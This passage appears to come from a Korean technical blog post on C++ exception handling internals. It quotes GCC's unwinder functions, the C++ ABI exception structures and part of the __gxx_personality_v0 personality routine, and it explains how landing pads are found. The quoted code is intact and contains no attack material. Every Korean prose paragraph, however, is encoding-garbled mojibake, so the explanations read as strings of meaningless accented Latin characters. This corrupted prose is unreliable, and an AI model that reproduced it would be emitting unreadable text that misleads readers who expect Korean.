class="line"><span class="comment">               diagnose these and merely crashes.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fs.personality) &#123;</span><br><span class="line">            code = (*fs.personality)(<span class="number">1</span>, _UA_CLEANUP_PHASE | match_handler,</span><br><span class="line">                                     exc-&gt;exception_class, exc, context);</span><br><span class="line">            <span class="keyword">if</span> (code == _URC_INSTALL_CONTEXT)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">                <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t let us unwind past the handler context.  */</span></span><br><span class="line">        <span class="built_in">gcc_assert</span>(!match_handler);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">uw_update_context</span>(context, &amp;fs);</span><br><span class="line">        _Unwind_Frames_Increment(context, frames);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *frames_p = frames;</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_Unwind_Resume</code> í•¨ìˆ˜ëŠ” catch ë¸”ë¡ì´ ì•„ë‹Œ, ìì› í•´ì œ ë“±ì„ ìˆ˜í–‰í•˜ëŠ” cleanup ì½”ë“œì—ì„œ í•„ìš”í•œ ì‘ì—…ì„ ë§ˆì¹˜ê³  ìŠ¤íƒì„ ê³„ì† ë˜ê°ê¸° ìœ„í•´ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. ì•ì„œ <code>eh1</code> ë°”ì´ë„ˆë¦¬ì˜ <code>func</code> í•¨ìˆ˜ ê·¸ë˜í”„ë¥¼ ìº¡ì³í•œ ê·¸ë¦¼ì„ ë³´ë©´ ëœë”© íŒ¨ë“œì˜ ë§ˆì§€ë§‰ ë¶€ë¶„ì—ì„œ <code>_Unwind_Resume</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì‹œì ì—ì„œëŠ” ì´ë¯¸ search ë‹¨ê³„ë¥¼ ìˆ˜í–‰í•˜ì—¬ í˜¸ì¶œ ìŠ¤íƒ ìƒì—ì„œ catch ë¸”ë¡ì˜ ì¡´ì¬ê°€ í™•ì¸ëœ ìƒíƒœì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê³§ë°”ë¡œ <code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ cleanup ë‹¨ê³„ë¥¼ ì§„í–‰í•˜ë©´ì„œ ë‹¤ìŒ ëœë”© íŒ¨ë“œìœ¼ë¡œ ì‹¤í–‰ íë¦„ì„ ì˜®ê¹ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Resume propagation of an existing exception.  This is used after</span></span><br><span class="line"><span class="comment">   e.g. executing cleanup code, and not to implement rethrowing.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> LIBGCC2_UNWIND_ATTRIBUTE</span><br><span class="line">_Unwind_Resume(<span class="keyword">struct</span> _Unwind_Exception *exc) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> this_context, cur_context;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_init_context</span>(&amp;this_context);</span><br><span class="line">    cur_context = this_context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Choose between continuing to process _Unwind_RaiseException</span></span><br><span class="line"><span class="comment">       or _Unwind_ForcedUnwind.  */</span></span><br><span class="line">    <span class="keyword">if</span> (exc-&gt;private_1 == <span class="number">0</span>)</span><br><span class="line">        code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        code = _Unwind_ForcedUnwind_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">gcc_assert</span>(code == _URC_INSTALL_CONTEXT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_install_context</span>(&amp;this_context, &amp;cur_context, frames);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ë¶€ì—ì„œ ì˜ˆì™¸ë¥¼ ì¼ìœ¼í‚¤ê³  ìŠ¤íƒì„ ë˜ê°ëŠ” ì „ë°˜ì ì¸ ë¡œì§ì„ ê·¸ë¦¼ìœ¼ë¡œ ë‚˜íƒ€ë‚´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/images/cpp-exception-handling/8.png" alt="8.png"></p><h3 id="c%2B%2B-abi" tabindex="-1">C++ ABI</h3><p>C++ ABIëŠ” C++ ì½”ë“œì—ì„œ ë°œìƒí•œ ì˜ˆì™¸ì™€ unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ì´ë¥¼ ì—°ê²°í•˜ëŠ” ë‹¤ë¦¬ ì—­í• ì„ í•©ë‹ˆë‹¤. C++ ABIì—ì„œ ì‚¬ìš©í•˜ëŠ” ì¤‘ìš”í•œ êµ¬ì¡°ì²´ë¡œëŠ” <code>__cxa_exception</code> ê³¼ <code>__cxa_eh_globals</code> ê°€ ìˆìŠµë‹ˆë‹¤.</p><p><code>__cxa_exception</code> ì€ C++ ì˜ˆì™¸ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. Unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì‚¬ìš©í•˜ëŠ” ì˜ˆì™¸ êµ¬ì¡°ì²´ì¸ <code>_Unwind_Exception</code> ì„ í¬í•¨í•˜ë©´ì„œ ì¶”ê°€ì ì¸ ì •ë³´ë¥¼ ê°–ì¶”ê³  ìˆìŠµë‹ˆë‹¤. <code>exceptionType</code> í•„ë“œëŠ” throw êµ¬ë¬¸ì—ì„œ ì „ë‹¬í•œ ì¸ìì˜ íƒ€ì…ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. <code>nextException</code> í•„ë“œëŠ” C++ ì˜ˆì™¸ êµ¬ì¡°ì²´ë“¤ì˜ ìŠ¤íƒì„ ë§Œë“¤ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ”ë°, í›„ìˆ í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A primary C++ exception object consists of a header, which is a wrapper</span></span><br><span class="line"><span class="comment">// around an unwind object header with additional C++ specific information,</span></span><br><span class="line"><span class="comment">// followed by the exception object itself.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cxa_exception</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Manage the exception object itself.</span></span><br><span class="line">  std::type_info *exceptionType;</span><br><span class="line">  <span class="built_in">void</span> (_GLIBCXX_CDTOR_CALLABI *exceptionDestructor)(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The C++ standard has entertaining rules wrt calling set_terminate</span></span><br><span class="line">  <span class="comment">// and set_unexpected in the middle of the exception cleanup process.</span></span><br><span class="line">  std::terminate_handler unexpectedHandler;</span><br><span class="line">  std::terminate_handler terminateHandler;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The caught exception stack threads through here.</span></span><br><span class="line">  __cxa_exception *nextException;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// How many nested handlers have caught this exception.  A negated</span></span><br><span class="line">  <span class="comment">// value is a signal that this object has been rethrown.</span></span><br><span class="line">  <span class="type">int</span> handlerCount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARM_EABI_UNWINDER__</span></span><br><span class="line">  <span class="comment">// Stack of exceptions in cleanups.</span></span><br><span class="line">  __cxa_exception* nextPropagatingException;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The number of active cleanup handlers for this exception.</span></span><br><span class="line">  <span class="type">int</span> propagationCount;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">// Cache parsed handler data from the personality routine Phase 1</span></span><br><span class="line">  <span class="comment">// for Phase 2 and __cxa_call_unexpected.</span></span><br><span class="line">  <span class="type">int</span> handlerSwitchValue;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *actionRecord;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *languageSpecificData;</span><br><span class="line">  _Unwind_Ptr catchTemp;</span><br><span class="line">  <span class="type">void</span> *adjustedPtr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// The generic exception header.  Must be last.</span></span><br><span class="line">  _Unwind_Exception unwindHeader;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>__cxa_eh_globals</code> ëŠ” ìŠ¤ë ˆë“œë§ˆë‹¤ í•˜ë‚˜ì”© ì¡´ì¬í•˜ëŠ” C++ ì˜ˆì™¸ êµ¬ì¡°ì²´ë“¤ì˜ ìŠ¤íƒì…ë‹ˆë‹¤. <code>caughtExceptions</code> í•„ë“œëŠ” ì˜ˆì™¸ ë°œìƒ í›„ ì²˜ë¦¬ê°€ ëë‚œ ì˜ˆì™¸ êµ¬ì¡°ì²´ë“¤ì˜ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì…ë‹ˆë‹¤. <code>uncaughtExceptions</code> í•„ë“œëŠ” ë°œìƒí–ˆì§€ë§Œ ì•„ì§ ì²˜ë¦¬ë˜ì§€ ì•Šì€ ì˜ˆì™¸ë“¤ì˜ ê°œìˆ˜ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. í˜„ì¬ ìŠ¤ë ˆë“œì˜ <code>__cxa_eh_globals</code> êµ¬ì¡°ì²´ëŠ” <code>__cxa_get_globals</code> ë˜ëŠ” <code>__cxa_get_globals_fast</code> í•¨ìˆ˜ë¥¼ í†µí•´ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Each thread in a C++ program has access to a __cxa_eh_globals object.</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cxa_eh_globals</span></span><br><span class="line">&#123;</span><br><span class="line">  __cxa_exception *caughtExceptions;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> uncaughtExceptions;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARM_EABI_UNWINDER__</span></span><br><span class="line">  __cxa_exception* propagatingExceptions;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>C++ ABIì—ì„œ throw êµ¬ë¬¸ìœ¼ë¡œ ë°œìƒí•œ ì˜ˆì™¸ë¥¼ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì€ ëŒ€ëµ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><code>__cxa_allocate_exception</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>__cxa_exception</code> êµ¬ì¡°ì²´ë¥¼ ë™ì  í• ë‹¹í•©ë‹ˆë‹¤.</li><li><code>__cxa_throw</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ì„œ í• ë‹¹í•œ ì˜ˆì™¸ êµ¬ì¡°ì²´ë¥¼ ì¸ìë¡œ ì „ë‹¬í•©ë‹ˆë‹¤. <code>__cxa_throw</code> í•¨ìˆ˜ëŠ” ë°˜í™˜í•˜ì§€ ì•Šìœ¼ë©°, ë‚´ë¶€ì ìœ¼ë¡œ unwind ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>_Unwind_RaiseException</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</li><li><code>_Unwind_RaiseException</code> í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ personality ë£¨í‹´ì„ í˜¸ì¶œí•©ë‹ˆë‹¤. Personality ë£¨í‹´ì€ LSDAë¥¼ í•´ì„í•˜ì—¬ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ êµ¬í•©ë‹ˆë‹¤.</li><li>ëœë”© íŒ¨ë“œë¡œ ì í”„í•©ë‹ˆë‹¤. ëœë”© íŒ¨ë“œê°€ catch ë¸”ë¡ì¸ ê²½ìš° <code>__cxa_begin_catch</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì˜ˆì™¸ êµ¬ì¡°ì²´ë¥¼ ìŠ¤íƒì˜ ê¼­ëŒ€ê¸°ì— í‘¸ì‹œí•©ë‹ˆë‹¤.</li><li>catch ë¸”ë¡ì˜ ëë‚˜ë©´ <code>__cxa_end_catch</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ìŠ¤íƒì—ì„œ ì˜ˆì™¸ êµ¬ì¡°ì²´ë¥¼ íŒí•˜ê³  ì†Œë©¸ì‹œí‚µë‹ˆë‹¤.</li></ol><p>ëŒ€ë¶€ë¶„ì˜ í•¨ìˆ˜ê°€ ìœ„ì— ì‘ì„±í•œ ë‚´ìš©ê³¼ ê°™ì´ ì§ê´€ì ì´ê³  êµ¬í˜„ì´ ë‹¨ìˆœí•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ë¬¸ë‹¨ì—ì„œëŠ” personality ë£¨í‹´ì˜ êµ¬í˜„ì„ ì¤‘ì ì ìœ¼ë¡œ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.</p><p>GCCì˜ C++ ABI êµ¬í˜„ì²´ì—ì„œ personality ë£¨í‹´ì˜ ì´ë¦„ì€ <code>__gxx_personality_v0</code> ì…ë‹ˆë‹¤. (LLVMë„ ë™ì¼í•œ ì´ë¦„ì„ ì‚¬ìš©í•˜ì§€ë§Œ êµ¬í˜„ì²´ê°€ ë‹¤ë¦…ë‹ˆë‹¤) ì´ í•¨ìˆ˜ëŠ” ì†ŒìŠ¤ ì½”ë“œê°€ ë³µì¡í•˜ê³  ARM ì•„í‚¤í…ì²˜ë¥¼ ìœ„í•œ ì½”ë“œë„ ì¤‘ê°„ì¤‘ê°„ ì„ì—¬ ìˆìŠµë‹ˆë‹¤. ì´í•´ë¥¼ ë•ê¸° ìœ„í•´ ì•„ë˜ ì½”ë“œëŠ” ì›ë³¸ ì½”ë“œì—ì„œ í•„ìš”í•˜ì§€ ì•Šì€ ë¶€ë¶„ì€ ì œì™¸í•˜ì˜€ìŠµë‹ˆë‹¤.</p><p>25í–‰ì—ì„œ LSDAì˜ ì£¼ì†Œë¥¼ ì–»ìŠµë‹ˆë‹¤. 44í–‰ì€ ë°˜ë³µë¬¸ì„ ì‚¬ìš©í•´ LSDAì˜ call-site í…Œì´ë¸”ì„ ìˆœíšŒí•˜ë©´ì„œ ì˜ˆì™¸ê°€ ë°œìƒí•œ ì½”ë“œ ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ” ë ˆì½”ë“œë¥¼ ì°¾ì•„ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ ê³„ì‚°í•˜ê³ , ì•¡ì…˜ í…Œì´ë¸”ì—ì„œì˜ í•´ë‹¹í•˜ëŠ” ë ˆì½”ë“œì˜ ì˜¤í”„ì…‹ <code>action_record</code> ë¥¼ ì–»ìŠµë‹ˆë‹¤. 77í–‰ì—ì„œ <code>action_record</code> ê°€ 0ì´ë©´ ëœë”© íŒ¨ë“œëŠ” cleanup ì½”ë“œë¡œ, <code>found_type</code> ì— <code>found_cleanup</code> ì„ ëŒ€ì…í•©ë‹ˆë‹¤. ì´ì™¸ì˜ ê²½ìš° catch ë¸”ë¡ì— í•´ë‹¹í•˜ë©°, 94í–‰ë¶€í„° LSDAì˜ action í…Œì´ë¸”ì„ ìˆœíšŒí•©ë‹ˆë‹¤. ë°œìƒí•œ ì˜ˆì™¸ì˜ íƒ€ì…ì— ëŒ€ì‘í•˜ëŠ” catch ë¸”ë¡ì´ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ê³  catch ë¸”ë¡ì„ ì°¾ì€ ê²½ìš° <code>found_type</code> ì— <code>found_handler</code> ë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</p><p>Personality ë£¨í‹´ì€ ìŠ¤íƒ ë˜ê°ê¸°ì˜ search ë‹¨ê³„ì™€ cleanup ë‹¨ê³„ ì¤‘ ì–´ëŠ ì‹œì ì—ì„œ í˜¸ì¶œë˜ì—ˆëŠ”ì§€ì— ë”°ë¼ ë™ì‘ì´ ë‹¤ë¦…ë‹ˆë‹¤. ì–´ëŠ ì‹œì ì—ì„œ í˜¸ì¶œë˜ì—ˆëŠ”ì§€ëŠ” ë‘ ë²ˆì§¸ ì¸ì <code>actions</code> ì˜ ê°’ì´ <code>_UA_SEARCH_PHASE</code> ì™€ <code>_UA_CLEANUP_PHASE</code> ì¤‘ ë¬´ì—‡ì¸ì§€ë¡œ êµ¬ë¶„í•©ë‹ˆë‹¤. 145í–‰ì—ì„œ í˜„ì¬ search ë‹¨ê³„ì¸ ê²½ìš° ë°œê²¬í•œ ëœë”© íŒ¨ë“œê°€ cleanup ì½”ë“œë©´ <code>_URC_CONTINUE_UNWIND</code>, catch ë¸”ë¡ì´ë©´ <code>_URC_HANDLER_FOUND</code> ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ cleanup ë‹¨ê³„ì¸ ê²½ìš° 180í–‰ì—ì„œ <code>_Unwind_SetIP</code> ë‚´ì¥ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>context-&gt;ra</code> í•„ë“œì— ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ ëŒ€ì…í•˜ê³  <code>_URC_INSTALL_CONTEXT</code> ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CONTINUE_UNWINDING                                     \</span></span><br><span class="line"><span class="meta">    do &#123;                                                       \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (__gnu_unwind_frame(ue_header, context) != _URC_OK) \</span></span><br><span class="line"><span class="meta">            return _URC_FAILURE;                               \</span></span><br><span class="line"><span class="meta">        return _URC_CONTINUE_UNWIND;                           \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERSONALITY_FUNCTION __gxx_personality_v0</span></span><br><span class="line"></span><br><span class="line"><span class="function">_Unwind_Reason_Code <span class="title">PERSONALITY_FUNCTION</span><span class="params">(<span class="type">int</span> version,</span></span></span><br><span class="line"><span class="params"><span class="function">                         _Unwind_Action actions,</span></span></span><br><span class="line"><span class="params"><span class="function">                         _Unwind_Exception_Class exception_class,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">struct</span> _Unwind_Exception *ue_header,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">struct</span> _Unwind_Context *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// Shortcut for phase 2 found handler for domestic exception.</span></span><br><span class="line">    <span class="keyword">if</span> (actions == (_UA_CLEANUP_PHASE | _UA_HANDLER_FRAME) &amp;&amp; !foreign_exception) &#123;</span><br><span class="line">        <span class="built_in">restore_caught_exception</span>(ue_header, handler_switch_value,</span><br><span class="line">                                 language_specific_data, landing_pad);</span><br><span class="line">        found_type = (landing_pad == <span class="number">0</span> ? found_terminate : found_handler);</span><br><span class="line">        <span class="keyword">goto</span> install_context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    language_specific_data = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)</span><br><span class="line">        _Unwind_GetLanguageSpecificData(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If no LSDA, then there are no handlers or cleanups.</span></span><br><span class="line">    <span class="keyword">if</span> (!language_specific_data)</span><br><span class="line">        CONTINUE_UNWINDING;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Parse the LSDA header.</span></span><br><span class="line">    p = <span class="built_in">parse_lsda_header</span>(context, language_specific_data, &amp;info);</span><br><span class="line">    info.ttype_base = <span class="built_in">base_of_encoded_value</span>(info.ttype_encoding, context);</span><br><span class="line">    ip = _Unwind_GetIP(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ip_before_insn)</span><br><span class="line">        --ip;</span><br><span class="line">    landing_pad = <span class="number">0</span>;</span><br><span class="line">    action_record = <span class="number">0</span>;</span><br><span class="line">    handler_switch_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Search the call-site table for the action associated with this IP.</span></span><br><span class="line">    <span class="keyword">while</span> (p &lt; info.action_table) &#123;</span><br><span class="line">        _Unwind_Ptr cs_start, cs_len, cs_lp;</span><br><span class="line">        <span class="type">_uleb128_t</span> cs_action;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Note that all call-site encodings are &quot;absolute&quot; displacements.</span></span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_start);</span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_len);</span><br><span class="line">        p = <span class="built_in">read_encoded_value</span>(<span class="number">0</span>, info.call_site_encoding, p, &amp;cs_lp);</span><br><span class="line">        p = <span class="built_in">read_uleb128</span>(p, &amp;cs_action);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The table is sorted, so if we&#x27;ve passed the ip, stop.</span></span><br><span class="line">        <span class="keyword">if</span> (ip &lt; info.Start + cs_start)</span><br><span class="line">            p = info.action_table;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ip &lt; info.Start + cs_start + cs_len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cs_lp)</span><br><span class="line">                landing_pad = info.LPStart + cs_lp;</span><br><span class="line">            <span class="keyword">if</span> (cs_action)</span><br><span class="line">                action_record = info.action_table + cs_action - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> found_something;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If ip is not present in the table, call terminate.  This is for</span></span><br><span class="line">    <span class="comment">// a destructor inside a cleanup, or a library routine the compiler</span></span><br><span class="line">    <span class="comment">// was not expecting to throw.</span></span><br><span class="line">    found_type = found_terminate;</span><br><span class="line">    <span class="keyword">goto</span> do_something;</span><br><span class="line"></span><br><span class="line">found_something:</span><br><span class="line">    <span class="keyword">if</span> (landing_pad == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// If ip is present, and has a null landing pad, there are</span></span><br><span class="line">        <span class="comment">// no cleanups or handlers to be run.</span></span><br><span class="line">        found_type = found_nothing;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action_record == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// If ip is present, has a non-null landing pad, and a 